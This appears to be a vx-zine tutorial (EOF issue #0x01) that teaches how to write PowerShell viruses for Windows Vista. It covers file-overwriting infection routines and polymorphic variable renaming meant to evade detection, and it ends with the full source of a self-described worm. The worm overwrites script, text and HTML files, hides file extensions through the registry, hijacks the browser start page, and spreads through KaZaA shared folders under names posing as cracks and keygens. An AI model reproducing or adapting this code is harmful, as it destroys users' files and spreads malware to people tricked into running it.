@@ -1,0 +1,430 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: sk0r,Czybik/EOF || <a style="text-decoration: none" href="../mainmenu/articles.htm"><span style="text-decoration: none">Back to articles</span></a> ||<hr></pre>
+<pre>
+||PowerShell
+||
+||Viruses
+||______________________________________
+------------------------------------------
+
++-----------------------------------------+
+|1: What is PowerShell?                   |+
+|2: About this tutorial                   |+
+|3: First commands                        |+
+|4: Infection methods                     |+
+|5: Polymorphism                          |+
+|6: Source code Bat/Polymsh.A             |+
+|7: About me                              |+
++-----------------------------------------++
+ +++++++++++++++++++++++++++++++++++++++++++
+
++-----------------------------------------------------+
+|Author: sk0r/Czybik                                  |+
+|Translated by: SkyOut                                |+
++-----------------------------------------------------++
+ +++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
++-----------------------------------------------------+
+|www.sk0r-czybik.de.vu                                |+
+|www.eof-project.net                                  |+
++-----------------------------------------------------++
+ +++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+________________________________________________________________________________
+
+ ======================
+|1: What is PowerShell?|
+ ======================
+
+PowerShell is the powerful script interpreter of Microsofts Windows Vista. Windows
+Vista is the following operating system after Windows XP. It has not been released
+yet, but this will change soon. Powershell is a following version of 4nt.exe,
+command.exe and cmd.exe. It is also called Monad (MSH). With the PowerShell a new era
+started. The syntax is similar to the one of PHP, you can code complex scripts, accessing
+ActiveX objects or the .Net framework. To use the PowerShell on Windows XP you need
+the .Net framework version 2.0. Its complexity allows us to code malware for it ;)
+Until now there have been only small viruses, not more then PoCs, but from time to time
+(and with the release of Windows Vista) we will see more and more powerful viruses for it,
+I am sure.
+
+ ======================
+|2: About this tutorial|
+ ======================
+
+In this tutorial I will teach you the basics of PowerShell coding and I will show you
+techniques like polymorphic variable changing, I found out some days ago :). Then I will
+give you some tips and tricks, making our virus complete :D. At the end you will find
+the source code of Bat/Polymsh.A, also called Perl/Cinepik or PHP/Polymsg.G!
+(It is the first polymorphic Windows Vista worm). I wrote this tutorial to give others
+basic ideas about PowerShell scripting. When you are finished with reading you should
+be able to write own Windows Vista viruses.
+
+ =================
+|3: First commands|
+ =================
+
+In the following part I will show you the syntax of the PowerShell, with some example
+codes. This should be enough, as i said, it is like PHP.
+
+Text output:
+------------
+
++----------------------------------------------------------------------------+
+|                                                                            |
+|echo &quot;Hello world!&quot;;                                                        |
+|echo 'Hello world'; #You can use this as quotes, too.                       |
+|write &quot;Hello world!&quot;;                                                       |
+|write-output &quot;Hello world!&quot;;                                                |
+|write-warning &quot;Hello world!&quot;;                                               |
+|                                                                            |
++----------------------------------------------------------------------------+
+
+As you can see there are several commands for text output. It does not matter which
+quotes you are using. Comments are initialized by &quot;#&quot;. &quot;Echo&quot; is the same as &quot;write&quot;
+or &quot;write-output&quot;, &quot;write-warning&quot; will put out a warning message, the text will be
+coloured yellow, with the text &quot;Warning:&quot; in front of it.
+
+Variables:
+----------
+
++-------------------------------------------------+
+|                                                 |
+|$aa = &quot;String&quot;;                                  |
+|$bb = &quot;Hello, how are u?&quot;;                       |
+|$cc = &quot;24&quot;;                                      |
+|$dd = 1337;                                      |
+|$44 = &quot;I am a number&quot;;                           |
+|                                                 |
++-------------------------------------------------+
+
+Well, look at it and you will recognize, that it is exactly the same as in every other
+language, only one difference: You can use numbers as variables, that's not the
+case in every language.
+
+Loops:
+------
+
++----------------------------------------------------------------------------------+
+|                                                                                  |
+|#FOR-LOOP: for ($i = 1; $i -lt 10; $i++) { #Some code }                           |
+|#FOR-EACH-Loop: foreach ($number in $list) { #Some code }                         |
+|#WHILE-Loop: while ($number -eq 2) { #Some code }                                 |
+|#IF-Function: if ($var -eq &quot;hello&quot;) { echo &quot;$var is exactly hello&quot;; }             |
+|                                                                                  |
++----------------------------------------------------------------------------------+
+
+Procedures:
+-----------
+
+A procedure has the following structure:
+
++-------------------------------------------------+
+|                                                 |
+|function MyFunction($var)                        |
+|{                                                |
+|#Some code                                       |
+|}                                                |
+|                                                 |
++-------------------------------------------------+
+
+You could also do this without &quot;$var&quot; if you don't want to hand over a variable.
+Write some code, that should only be executed, when a special event occurs in such
+a function. You can call this function just by writing its name.
+
+Operators:
+----------
+
++-------------------------------------------------+
+|                                                 |
+|#Operators to compare values:                    |
+|-eq = equal                                      |
+|-lt = less then                                  |
+|-le = less or equal                              |
+|-ne = not equal                                  | 
+|-gt = greater then                               |
+|-ge = greater or equal                           |
+|                                                 |
+|#Arith. operators:                               |
+|+ = add.                                         |
+|- = sub.                                         |
+|* = multi.                                       |
+|/ = div.                                         |
+|                                                 |
++-------------------------------------------------+
+
+That should be enough for the moment, you should be able to write some scripts now.
+
+ ====================
+|4: Infection methods|
+ ====================
+
+Now we will learn to write our first viral codes. In the following example we want
+to get the path+name+extension of our virus:
+
++---------------------------------------------------------------------------------------------------------+
+|                                                                                                         |
+|# First we want to get the path to our virus:                                                            |
+|$gtMshFiles = get-childitem *.msh; # Listing of all *.msh files in the folder                            |
+|foreach ($MshDatei in $gtMshFiles)                                                                       |
+|{ if ($MshDatei.length -eq 245) # We have a size of 245 bytes                                            |
+|{                                                                                                        |
+|$ScriptName = $MshDatei.name                                                                             |
+|}                                                                                                        |
+|}                                                                                                        |
+|# Here we will check every Msh file if it is 245 bytes big                                               |
+|# If this is the case this should be our virus                                                           |
+|# so we write the path, name and extension into some variable                                            |
+|                                                                                                         |
+|# Another way would be:                                                                                  |
+|#sk0rCzybik                                                                                              |
+|$gtMshFiles = get-childitem *.msh                                                                        |
+|foreach ($MshDatei in $gtMshFiles)                                                                       |
+|{                                                                                                        |
+|$cont = get-content $MshDatei.name                                                                       |
+|if ($cont[2] -eq &quot;#sk0rCzybik&quot;)                                                                          |
+|{                                                                                                        |
+|$ScriptName = $MshDatei.name                                                                             |
+|}                                                                                                        |
+|}                                                                                                        |
+|# Here we open and read every Msh file in the folder                                                     |
+|# Via an IF-Function we check if #sk0rCzybik is in line 2                                                |
+|# If this is the case, this must be our virus -&gt; save into variable                                      |
+|                                                                                                         |
+|Now we want to overwrite all Msh files with our virus:                                                   |
+|                                                                                                         |
+|$VictimMshs = get-childitem *.msh                                                                        |
+|$VirCont = get-content $ScriptName                                                                       |
+|foreach ($Victim in $VictimMshs)                                                                         |
+|{                                                                                                        |
+|echo $VirCont &gt;&gt; $Victim.name                                                                            |
+|}                                                                                                        |
+|# Here we write the virus code into every Msh file in the current folder                                 |
+|                                                                                                         |
+|# Now we want to write our virus code on first place:                                                    |
+|$VictimMshs = get-childitem *.msh                                                                        |
+|$VirCont = get-content $ScriptName                                                                       |
+|foreach ($Victim in $VictimMshs)                                                                         |
+|{                                                                                                        |
+|$VicCont = get-content $Victim.name                                                                      |
+|del $Victim.name                                                                                         |
+|echo $VirCont &gt;&gt; $Victim.name                                                                            |
+|echo $VicCont &gt;&gt; $Victim.name                                                                            |
+|}                                                                                                        |
+|# We open every Msh file and read it                                                                     |
+|# We delete it, create a new one with our virus code and append                                          |
+|# the old code                                                                                           |
+|                                                                                                         |
+|# Now we want to infect other files too and make them Msh files                                          |
+|$allfiles = get-content *.*                                                                              |
+|foreach ($Victim in $allfiles)                                                                           |
+|{                                                                                                        |
+|if ($Victim = &quot;HTML&quot;)                                                                                    |
+|{                                                                                                        |
+|$normname = $allfiles.name                                                                               |
+|$withext = $normalname + &quot;.msh&quot;                                                                          |
+|del $Victim.name                                                                                         |
+|echo $virCont &gt;&gt; $Victim.Name                                                                            |
+|rename-item &quot;$allfiles&quot; $withext                                                                         |
+|}                                                                                                        |
+|}                                                                                                        |
+|# If we find a HTML file in the folder, then the forst variable saves the path                           |
+|# to it, the second one saves it and the extension .msh, you have to do it like this                     |
+|# otherwise you will get errors. The file will be deleted, the virus code written                        |
+|# into the new created file and the extension will be changed to .msh via                                |
+|# Rename-Function                                                                                        |
+|                                                                                                         |
++---------------------------------------------------------------------------------------------------------+
+
+ ===============
+|5: Polymorphism|
+ ===============
+
+It's always challenging for virus writers to make it difficult to detect their creations.
+This can be done with polymorphism, permutation or metamorphism. Until now this has not
+been done for the PowerShell, if I'm right, but I found a way to change variables in
+every infected file. Only luck of course. So we see, variable polymorphism is possible ;)
+I did the first stop, now it must be improved. Its nothing complicate, with the random
+number generator all is done quickly, but there is no function (I don't know one,
+yet) to change numbers into signs (ASCHII), so you have to write an own IF-Function.
+Anyway, it's not bad. Now a little examaple for variable polymorphism:
+
++-------------------------------------------------------------------------------------------------------------------------------------+
+|                                                                                                                                     |
+|$ArrayVars = (&quot;Varia&quot;,&quot;sabba&quot;,&quot;hallo&quot;,&quot;nocheinname&quot;) ; #Array with variables to change foreach ($StringsToPoly                       |
+|in $ArrayVars) # For every string in ArrayVars --&gt; execute loop { for ($i = 0; $i -le $StringsToPoly.length; $i++) #                 |
+|$i = 0, smaller then length of string, increased by 1 all the time { $intRandomNumb = (new-object Random).next(1*27) ;               |
+|#Generate random number between 0 and 26. if ($intRandomNumb -eq 0) { $AscString = $AscString + &quot;a&quot;; #ir random number               |
+|is 0 then $AscString = $AscString with &quot;a&quot; being append } elseif ($intRandomNumb -ne 0) # etc... { $AscString =                      |
+|$AscString + &quot;&quot;; } if ($intRandomNumb -eq 1) { $AscString = $AscString + &quot;b&quot;; } elseif ($intRandomNumb -ne 1) {                      |
+|$AscString = $AscString + &quot;&quot;; } if ($intRandomNumb -eq 3) { $AscString = $AscString + &quot;c&quot;; } elseif ($intRandomNumb                  |
+|-ne 3) { $AscString = $AscString + &quot;&quot;; } if ($intRandomNumb -eq 4) { $AscString = $AscString + &quot;d&quot;; } elseif                         |
+|($intRandomNumb -ne 4) { $AscString = $AscString + &quot;&quot;; } if ($intRandomNumb -eq 5) { $AscString = $AscString + &quot;e&quot;;                  |
+|} elseif ($intRandomNumb -ne 5) { $AscString = $AscString + &quot;&quot;; } if ($intRandomNumb -eq 6) { $AscString = $AscString                |
+|+ &quot;f&quot;; } elseif ($intRandomNumb -ne 6) { $AscString = $AscString + &quot;&quot;; } if ($intRandomNumb -eq 7) { $AscString =                    |
+|$AscString + &quot;g&quot;; } elseif ($intRandomNumb -ne 7) { $AscString = $AscString + &quot;&quot;; } if ($intRandomNumb -eq 8) {                      |
+|$AscString = $AscString + &quot;h&quot;; } elseif ($intRandomNumb -ne 8) { $AscString = $AscString + &quot;&quot;; } if ($intRandomNumb                  |
+|-eq 9) { $AscString = $AscString + &quot;i&quot;; } elseif ($intRandomNumb -ne 9) { $AscString = $AscString + &quot;&quot;; } if                         |
+|($intRandomNumb -eq 10) { $AscString = $AscString + &quot;j&quot;; } elseif ($intRandomNumb -ne 10) { $AscString = $AscString                  |
+|+ &quot;&quot;; } if ($intRandomNumb -eq 11) { $AscString = $AscString + &quot;k&quot;; } elseif ($intRandomNumb -ne 11) { $AscString =                  | 
+|$AscString + &quot;&quot;; } if ($intRandomNumb -eq 12) { $AscString = $AscString + &quot;l&quot;; } elseif ($intRandomNumb -ne 12) {                    |
+|$AscString = $AscString + &quot;&quot;; } if ($intRandomNumb -eq 13) { $AscString = $AscString + &quot;m&quot;; } elseif                                 |
+|($intRandomNumb -ne 13) { $AscString = $AscString + &quot;&quot;; } if ($intRandomNumb -eq 14) { $AscString = $AscString +                     |
+|&quot;n&quot;; } elseif ($intRandomNumb -ne 14) { $AscString = $AscString + &quot;&quot;; } if ($intRandomNumb -eq 15) { $AscString =                    |
+|$AscString + &quot;o&quot;; } elseif ($intRandomNumb -ne 15) { $AscString = $AscString + &quot;&quot;; } if ($intRandomNumb -eq 16) {                    |
+|$AscString = $AscString + &quot;p&quot;; } elseif ($intRandomNumb -ne 16) { $AscString = $AscString + &quot;&quot;; } if                                 |
+|($intRandomNumb -eq 17) { $AscString = $AscString + &quot;q&quot;; } elseif ($intRandomNumb -ne 17) { $AscString = $AscString                  |
+|+ &quot;&quot;; } if ($intRandomNumb -eq 18) { $AscString = $AscString + &quot;r&quot;; } elseif ($intRandomNumb -ne 18) { $AscString =                  |
+|$AscString + &quot;&quot;; } if ($intRandomNumb -eq 19) { $AscString = $AscString + &quot;s&quot;; } elseif ($intRandomNumb -ne 19) {                    |
+|$AscString = $AscString + &quot;&quot;; } if ($intRandomNumb -eq 20) { $AscString = $AscString + &quot;t&quot;; } elseif ($intRandomNumb                 |
+|-ne 20) { $AscString = $AscString + &quot;&quot;; } if ($intRandomNumb -eq 21) { $AscString = $AscString + &quot;u&quot;; } elseif                       |
+|($intRandomNumb -ne 21) { $AscString = $AscString + &quot;&quot;; } if ($intRandomNumb -eq 22) { $AscString = $AscString +                     |
+|&quot;v&quot;; } elseif ($intRandomNumb -ne 22) { $AscString = $AscString + &quot;&quot;; } if ($intRandomNumb -eq 23) { $AscString =                    |
+|$AscString + &quot;w&quot;; } elseif ($intRandomNumb -ne 23) { $AscString = $AscString + &quot;&quot;; } if ($intRandomNumb -eq 24) {                    |
+|$AscString = $AscString + &quot;x&quot;; } elseif ($intRandomNumb -ne 24) { $AscString = $AscString + &quot;&quot;; } if                                 |
+|($intRandomNumb -eq 25) { $AscString = $AscString + &quot;y&quot;; } elseif ($intRandomNumb -ne 25) { $AscString = $AscString                  |
+|+ &quot;&quot;; } if ($intRandomNumb -eq 26) { $AscString = $AscString + &quot;z&quot;; } elseif ($intRandomNumb -ne 26) { $AscString =                  |
+|$AscString + &quot;&quot;; } } $ContentOfMyWorm = $ContentOfMyWorm.replace($StringsToPoly,$AscString); # Write old variables                   |
+|werden min new ones. Remove-Variable AscString #AscString will be removed for every string otherwise variable                        |
+|would become bigger and bigger. }                                                                                                    |
+|                                                                                                                                     |
++-------------------------------------------------------------------------------------------------------------------------------------+
+
+You see, its quite easy. Just cost me some days because I did not know the commands
+and first had to try them ^^. All in all its easy. If you find new ways making the
+detection more difficult, please mail me. Would be nice to see.
+
+ ============================
+|6: Source code Bat/Polymsh.A|
+ ============================
+
+That's the first polymorphic worm for Windows Vista, it took me several days to do it:
+
++-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+|                                                                                                                                                                               |
+|&lt; ? ############################################################################ # # # sk0r alias Czybik PowerShell Variable Poly                                              |
+|Worm # # =============================================== # # # # About how to contact sk0r alias Czybik: # #                                                                   |
+|----------------------------------------- # # Email-Address: sk0r1337@gmx.de # # Homepages: www.sk0r-scripts.tk - www.sk0r-virii.tk - www.czybik-kit.tk                        |
+|# # Irc-Channel: #vx-lab or #vxers @ undernet # # # # Informations about this worm : # # ------------------------------ # # This is the first PowerShell                       |
+|Worm which changes it # # variable names everytime the worm runs. # # The worm uses the two Objects (WScript.Shell # # and                                                     |
+|Scripting.FileSystemObject ) # # So this worm does the followthing explained shortly: # # - Spreads per P2P Client KaZaA Lite # # - Modifies some                              |
+|Registry values # # - Change specific variables in the code in an array # # - Overwrites .msh, .bat, .cmd, .log, .ini, .txt, .ps1, .js or .html files# # -                     |
+|overwritten .msh or .ps1 files have our source at first and the file # # source at second place. the other files listed above will be # # overwritten. the                     |
+|extension will be changed to .msh # # - The payload, a info message, will appear if the time is greater # # then 17:00:00. It will show informations # #                       |
+|# # Structure of the worm: # # ----------------------- # # [Code] # # 'explanation # # # # Note: Sorry about my bad english # # If I would explain this in                     |
+|german everybody would understand # # better. But I decided to comment the worm in english, because # # everybody who codes in PowerShell can                                  |
+|read and learn # # form this worm. I needed some days do made this worm. because I # # had no tutorials I had to find out the most commands                                    |
+|myself. # # So please email me, what you think of this worm # # #                                                                                                              |
+|############################################################################ # $fso = New-Object -Com                                                                          |
+|Scripting.FileSystemObject ; $sysdir = $fso.GetSpecialFolder(1) ; $wshs = New-Object -Com WScript.Shell ; $ArrayVars =                                                         |
+|(&quot;fso&quot;,&quot;wshs&quot;,&quot;ArrayVars&quot;,&quot;sysdir&quot;,&quot;gtFileSize&quot;,&quot;AllMshDateinCurDir&quot;,&quot;KazaaDir&quot;,&quot;gtMySelfToCopy&quot;,&quot;NormalName&quot;,                                                                 |
+|&quot;intHomepage&quot;,&quot;strHomepage&quot;,&quot;PowerShellScript&quot;,&quot;MySelfWorm&quot;,&quot;ContentOfMyWorm&quot;,&quot;StringsToPoly&quot;,&quot;PolymorphicPowerShell&quot;,&quot;EndName&quot;,                                               |
+|&quot;gtFilesToInfect&quot;,&quot;InfectAllFilesNow&quot;,&quot;gtCurrentDate&quot;,&quot;intRandomNumb&quot;,&quot;AscString&quot;,&quot;VictimDateien&quot;,&quot;gtvicpscon&quot;,&quot;gtvicmshcon&quot;) ;                                                |
+|$gtFileSize = 14370 ; $AllMshDateinCurDir = get-childitem *.msh ; # here we declare five variables. $fso creates the # Scripting.FileSystemObject.                             |
+|the $wshs creates # the WScript.Shell Object. The Variable $ArrayVars # contains all variable names we want to change by each run # $gtFileSize                                |
+|contains the file size as integer # $AllMshDateinCurDir contains all msh files in current direcory #                                                                           |
+|======================================================= $intHomepage = (new-object Random).Next(1*3) if                                                                        |
+|($intHomepage -eq 0) { $strHomepage = &quot;http://www.sk0r-scripts.tk&quot;; } elseif ($intHomepage -eq 1) { $strHomepage = &quot;http://www.sk0r-virii.tk&quot;; }                               |
+|elseif ($intHomepage -eq 2) { $strHomepage = &quot;http://www.czybik-kit.tk&quot;; } # Here we create a random number from 1 till 3. # for each value the                                |
+|variable $strHomepages # contains a other homepage address # ===========================================                                                                       |
+|$wshs.regwrite(&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden&quot;, 0, &quot;REG_DWORD&quot;);                                                        |
+|$wshs.regwrite(&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt&quot;, 1, &quot;REG_DWORD&quot;);                                                   |
+|$wshs.regwrite(&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization&quot;, &quot;Infected                                                             |
+|Poly&quot;,&quot;REG_SZ&quot;); $wshs.regwrite(&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner&quot;,                                                             |
+|&quot;sk0rCzybik&quot;,&quot;REG_SZ&quot;); $wshs.regwrite(&quot;HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title&quot;, &quot;Infected by a poly                                         |
+|ps worm&quot;,&quot;REG_SZ&quot;); $wshs.regwrite(&quot;HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page&quot;, &quot;$strHomepage&quot;) # Here                                            |
+|we write some registry values to the # system registry. Our homepage address will # be adden, too. After changing the values the # user cant see                               |
+|hidden files and file extensions. # the registered organisation will be changed to # Infected Poly, the registered owner will be changed # to sk0rCzybik                       |
+|and the Title of the internet explorer # will be changed to Infected by a poly ps worm foreach ($PowerShellScript in $AllMshDateinCurDir) { if                                 |
+|($PowerShellScript.Length=$gtFileSize) { $MySelfWorm = $PowerShellScript.Name; } } # this loop checks all msh files in the current directory # if a                            |
+|files exists with our searched file size, the # variable $MySelfWorm contains the path and the name # to our worm #                                                            |
+|=================================================== $opnMyForRead = $fso.OpenTextFile($MySelfWorm,1) ;                                                                         |
+|$ContentOfMyWorm = $opnMyForRead.ReadAll() ; $opnMyForRead.Close() ; # Here we open the worm (the file itself) for reading. # the whole                                        |
+|worm content will be contented by the # variable $ContentOfMyWorm. After that # we close our worm (the file itself). #                                                         |
+|==================================== $gtFilesToInfect = get-childitem *.* foreach ($VictimDateien in $gtFilesToInfect) {                                                       |
+|foreach ($StringsToPoly in $ArrayVars) { for ($i = 0; $i -le $StringsToPoly.length; $i++) { $intRandomNumb = (new-object Random).next(1*27) ; if                               |
+|($intRandomNumb -eq 0) { $AscString = $AscString + &quot;a&quot;; } elseif ($intRandomNumb -ne 0) { $AscString = $AscString + &quot;&quot;; } if ($intRandomNumb                                   |
+|-eq 1) { $AscString = $AscString + &quot;b&quot;; } elseif ($intRandomNumb -ne 1) { $AscString = $AscString + &quot;&quot;; } if ($intRandomNumb -eq 3) { $AscString                               |
+|= $AscString + &quot;c&quot;; } elseif ($intRandomNumb -ne 3) { $AscString = $AscString + &quot;&quot;; } if ($intRandomNumb -eq 4) { $AscString = $AscString +                                    |
+|&quot;d&quot;; } elseif ($intRandomNumb -ne 4) { $AscString = $AscString + &quot;&quot;; } if ($intRandomNumb -eq 5) { $AscString = $AscString + &quot;e&quot;; } elseif                                     |
+|($intRandomNumb -ne 5) { $AscString = $AscString + &quot;&quot;; } if ($intRandomNumb -eq 6) { $AscString = $AscString + &quot;f&quot;; } elseif ($intRandomNumb                                   |
+|-ne 6) { $AscString = $AscString + &quot;&quot;; } if ($intRandomNumb -eq 7) { $AscString = $AscString + &quot;g&quot;; } elseif ($intRandomNumb -ne 7) { $AscString                               |
+|= $AscString + &quot;&quot;; } if ($intRandomNumb -eq 8) { $AscString = $AscString + &quot;h&quot;; } elseif ($intRandomNumb -ne 8) { $AscString = $AscString + &quot;&quot;;                                |
+|} if ($intRandomNumb -eq 9) { $AscString = $AscString + &quot;i&quot;; } elseif ($intRandomNumb -ne 9) { $AscString = $AscString + &quot;&quot;; } if                                              |
+|($intRandomNumb -eq 10) { $AscString = $AscString + &quot;j&quot;; } elseif ($intRandomNumb -ne 10) { $AscString = $AscString + &quot;&quot;; } if                                                 |
+|($intRandomNumb -eq 11) { $AscString = $AscString + &quot;k&quot;; } elseif ($intRandomNumb -ne 11) { $AscString = $AscString + &quot;&quot;; } if                                                 |
+|($intRandomNumb -eq 12) { $AscString = $AscString + &quot;l&quot;; } elseif ($intRandomNumb -ne 12) { $AscString = $AscString + &quot;&quot;; } if                                                 |
+|($intRandomNumb -eq 13) { $AscString = $AscString + &quot;m&quot;; } elseif ($intRandomNumb -ne 13) { $AscString = $AscString + &quot;&quot;; } if                                                 |
+|($intRandomNumb -eq 14) { $AscString = $AscString + &quot;n&quot;; } elseif ($intRandomNumb -ne 14) { $AscString = $AscString + &quot;&quot;; } if                                                 |
+|($intRandomNumb -eq 15) { $AscString = $AscString + &quot;o&quot;; } elseif ($intRandomNumb -ne 15) { $AscString = $AscString + &quot;&quot;; } if                                                 |
+|($intRandomNumb -eq 16) { $AscString = $AscString + &quot;p&quot;; } elseif ($intRandomNumb -ne 16) { $AscString = $AscString + &quot;&quot;; } if                                                 |
+|($intRandomNumb -eq 17) { $AscString = $AscString + &quot;q&quot;; } elseif ($intRandomNumb -ne 17) { $AscString = $AscString + &quot;&quot;; } if                                                 | 
+|($intRandomNumb -eq 18) { $AscString = $AscString + &quot;r&quot;; } elseif ($intRandomNumb -ne 18) { $AscString = $AscString + &quot;&quot;; } if                                                 |
+|($intRandomNumb -eq 19) { $AscString = $AscString + &quot;s&quot;; } elseif ($intRandomNumb -ne 19) { $AscString = $AscString + &quot;&quot;; } if                                                 |
+|($intRandomNumb -eq 20) { $AscString = $AscString + &quot;t&quot;; } elseif ($intRandomNumb -ne 20) { $AscString = $AscString + &quot;&quot;; } if                                                 |
+|($intRandomNumb -eq 21) { $AscString = $AscString + &quot;u&quot;; } elseif ($intRandomNumb -ne 21) { $AscString = $AscString + &quot;&quot;; } if                                                 |
+|($intRandomNumb -eq 22) { $AscString = $AscString + &quot;v&quot;; } elseif ($intRandomNumb -ne 22) { $AscString = $AscString + &quot;&quot;; } if                                                 |
+|($intRandomNumb -eq 23) { $AscString = $AscString + &quot;w&quot;; } elseif ($intRandomNumb -ne 23) { $AscString = $AscString + &quot;&quot;; } if                                                 |
+|($intRandomNumb -eq 24) { $AscString = $AscString + &quot;x&quot;; } elseif ($intRandomNumb -ne 24) { $AscString = $AscString + &quot;&quot;; } if                                                 |
+|($intRandomNumb -eq 25) { $AscString = $AscString + &quot;y&quot;; } elseif ($intRandomNumb -ne 25) { $AscString = $AscString + &quot;&quot;; } if                                                 |
+|($intRandomNumb -eq 26) { $AscString = $AscString + &quot;z&quot;; } elseif ($intRandomNumb -ne 26) { $AscString = $AscString + &quot;&quot;; } }                                                  |
+|$ContentOfMyWorm = $ContentOfMyWorm.replace($StringsToPoly,$AscString); Remove-Variable AscString } if ($VictimDateien = &quot;msh&quot;) {                                              |
+|$gtvicmshcon = get-content $VictimDateien.name ; if ($gtvicmshcon[517] -ne &quot;#sk0r alias Czybik&quot;) { del $VictimDateien.name ; echo                                              |
+|$ContentOfMyWorm &gt;&gt; $VictimDateien.name ; echo $gtvicmshcon &gt;&gt; $VictimDateien.name ; } } if ($VictimDateien = &quot;ps1&quot;) { $gtvicpscon =                                           |
+|get-content $VictimDateien.name ; if ($gtvicpscon[517] -ne &quot;#sk0r alias Czybik&quot;) { del $VictimDateien.name ; echo $ContentOfMyWorm &gt;&gt;                                          |
+|$VictimDateien.name ; echo $gtvicpscon &gt;&gt; $VictimDateien.name ; } } if ($VictimDateien = &quot;bat&quot;) { $NormalName = $gtFilesToInfect.name ;                                        |
+|$EndName = $NormalName+&quot;.msh&quot; ; del VictimDateien.name ; echo $ContentOfMyWorm &gt;&gt; VictimDateien.name ; rename-item                                                             |
+|&quot;$gtFilesToInfect&quot; $EndName ; } if ($VictimDateien = &quot;cmd&quot;) { $NormalName = $gtFilesToInfect.name ; $EndName = $NormalName+&quot;.msh&quot; ;                                            |
+|del VictimDateien.name ; echo $ContentOfMyWorm &gt;&gt; VictimDateien.name ; rename-item &quot;$gtFilesToInfect&quot; $EndName ; } if ($VictimDateien =                                        |
+|&quot;log&quot;) { $NormalName = $gtFilesToInfect.name ; $EndName = $NormalName+&quot;.msh&quot; ; del VictimDateien.name ; echo $ContentOfMyWorm &gt;&gt;                                               |
+|VictimDateien.name ; rename-item &quot;$gtFilesToInfect&quot; $EndName ; } if ($VictimDateien = &quot;ini&quot;) { $NormalName = $gtFilesToInfect.name ;                                           |
+|$EndName = $NormalName+&quot;.msh&quot; ; del VictimDateien.name ; echo $ContentOfMyWorm &gt;&gt; VictimDateien.name ; rename-item                                                             |
+|&quot;$gtFilesToInfect&quot; $EndName ; } if ($VictimDateien = &quot;txt&quot;) { $NormalName = $gtFilesToInfect.name ; $EndName = $NormalName+&quot;.msh&quot; ; del                                        |
+|VictimDateien.name ; echo $ContentOfMyWorm &gt;&gt; VictimDateien.name ; rename-item &quot;$gtFilesToInfect&quot; $EndName ; } if ($VictimDateien = &quot;js&quot;)                                      |
+|{ $NormalName = $gtFilesToInfect.name ; $EndName = $NormalName+&quot;.msh&quot; ; del VictimDateien.name ; echo $ContentOfMyWorm &gt;&gt;                                                      |
+|VictimDateien.name ; rename-item &quot;$gtFilesToInfect&quot; $EndName ; } if ($VictimDateien = &quot;html&quot;) { $NormalName = $gtFilesToInfect.name ;                                          |
+|$EndName = $NormalName+&quot;.msh&quot; ; del VictimDateien.name ; echo $ContentOfMyWorm &gt;&gt; VictimDateien.name ; rename-item                                                             |
+|&quot;$gtFilesToInfect&quot; $EndName ; } } # Ok, hope I can explain this in english so you can understand :-D # The variable $gtFilesToInfect contains all                              |
+|files in the current # directory. and for each file in the directory # the for each string in the variable $ArrayVars a loop appears for # each char in a                      |
+|string. for each char a random number will be created # if the random number has a specific value the variable $AscString # contains a specific char.                          |
+|The If Statement is arranged alphabetically. # If all chars are looped, the string will be replaced with the new random # string. This happens for all                         |
+|strings in the $ArrayVars Variable. For each # string we need do delete the variable $AscString otherwise a new # variable name is too long and a it                           |
+|adds each string to the next string. # In the End the variable $ContentOfMyWorm contains the new # Souce-Code with the new variable names. #                                   |
+|then wee look if msh or ps1 files exists in our direcory. # if this is true we look if the file is infected. If not then # we write our worm source at the first               |
+|place and then write # the normal source of the file at second place. # Then we look if .bat, .cmd, .log, .ini, .txt, .js or .html files # exists in our folder.               |
+|If this is true, our worm overwrites the # the file and changes the extension to .msh #                                                                                        |
+|============================================================== $crtTheNewWorm =                                                                                                |
+|$fso.CreateTextFile(&quot;$sysdir\sk0rCzybik.msh&quot;); $crtTheNewWorm.Write($ContentOfMyWorm); $crtTheNewWorm.Close(); # Here a new msh file                                           |
+|with the new worm content will be created. # =====================================================                                                                             |
+|$gtMySelfToCopy = $fso.getfile(&quot;$sysdir\sk0rCzybik.msh&quot;); $KazaaDir =                                                                                                          |
+|$wshs.RegRead('HKEY_CURRENT_USER\Software\Kazaa\LocalContent\DownloadDir'); if ($KazaaDir -ne &quot;&quot;) { $gtMySelfToCopy =                                                          |
+|$fso.getfile($MySelfWorm) $gtMySelfToCopy.copy(&quot;$KazaaDir\Microsoft Windows Vista Cd-Key.txt.msh&quot;);                                                                            |
+|$gtMySelfToCopy.copy(&quot;$KazaaDir\Windows Vista Update.msh&quot;); $gtMySelfToCopy.copy(&quot;$KazaaDir\Ad-aware SE Personal Edition                                                       |
+|1.06r1.msh&quot;); $gtMySelfToCopy.copy(&quot;$KazaaDir\Ashampoo Media Player 2.03 install.msh&quot;); $gtMySelfToCopy.copy(&quot;$KazaaDir\Allround WinZIP                                        |
+|Key Generator.msh&quot;); $gtMySelfToCopy.copy(&quot;$KazaaDir\Talisman Desktop 2.99 Crack.msh&quot;); $gtMySelfToCopy.copy(&quot;$KazaaDir\Nero Burning                                           |
+|Rom 6.6.0.13 Crack.msh&quot;); $gtMySelfToCopy.copy(&quot;$KazaaDir\Kaspersky KeyGen working.msh&quot;); $gtMySelfToCopy.copy(&quot;$KazaaDir\Daemon                                               |
+|Tools Install + Crack.rar.msh&quot;); $gtMySelfToCopy.copy(&quot;$KazaaDir\AVP - AntiVirus Key Generator.msh&quot;); } # Here the variable Kazaa dir reads a                                  |
+|registry key, which contains the # path to the My Shared Folder path. If it exists the worm copys # itself as some filenames in the My Shared Folder                           |
